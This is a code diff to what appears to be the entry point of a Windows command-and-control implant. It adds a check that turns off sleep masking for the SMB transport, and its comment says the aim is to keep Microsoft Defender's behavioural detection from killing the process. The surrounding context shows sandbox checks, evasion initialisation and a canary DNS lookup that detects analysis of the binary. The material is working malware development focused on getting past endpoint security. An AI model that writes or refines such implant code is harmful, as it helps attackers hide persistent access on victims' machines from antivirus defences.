@@ -8,6 +8,7 @@
 #include "evasion.h"
 #include "api_resolve.h"
 #include "dotnet.h"
+#include <string.h>
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
@@ -21,6 +22,13 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     api_init();
     sandbox_check();
     evasion_init();
+
+    /* SMB child: no accept_thread runs (client-only), so g_conn_thread_count stays 0.
+     * sleep_masked() would XOR .text → PAGE_NOACCESS, triggering Defender behavioural
+     * detection and killing the process after the first failed registration attempt.
+     * Inhibit sleep masking for the entire SMB child lifetime. */
+    if (strcmp(AGENT_TRANSPORT, "smb") == 0)
+        evasion_conn_enter();
 
     /* Canary DNS lookup — triggers server-side burn detection if this binary
      * is sandbox-analyzed before it registers. Fire-and-forget. */
